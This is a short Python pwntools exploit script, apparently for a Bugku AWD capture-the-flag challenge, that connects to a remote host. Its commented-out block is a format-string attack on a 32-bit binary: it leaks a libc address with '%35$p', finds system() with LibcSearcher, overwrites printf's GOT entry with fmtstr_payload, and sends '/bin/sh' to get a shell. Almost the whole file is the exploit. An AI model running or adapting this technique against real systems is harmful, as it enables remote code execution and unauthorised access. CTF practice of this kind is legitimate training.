from pwn import *
from LibcSearcher import LibcSearcher
#context.update( os = 'linux', arch = "i386",timeout = 1)
#p = process("./helloworld")
p = remote("192-168-1-31.awd.bugku.cn",'9999')

'''
printf_got = 0x0804A014

gdb.attach(p,"b *0x080485CA")
sleep(1)

payload =  "%35$p"
p.sendline(payload)

p.recvline()

__libc_start_main =  int(p.recv(len("0xf7db37ae")),16) - 222

libc = LibcSearcher("__libc_start_main",__libc_start_main)
libc_base = __libc_start_main-libc.dump("__libc_start_main")
system = libc_base + libc.dump("system")

payload = fmtstr_payload(6,{printf_got:system})
p.sendline(payload)
p.sendline("/bin/sh\x00")
'''
p.interactive()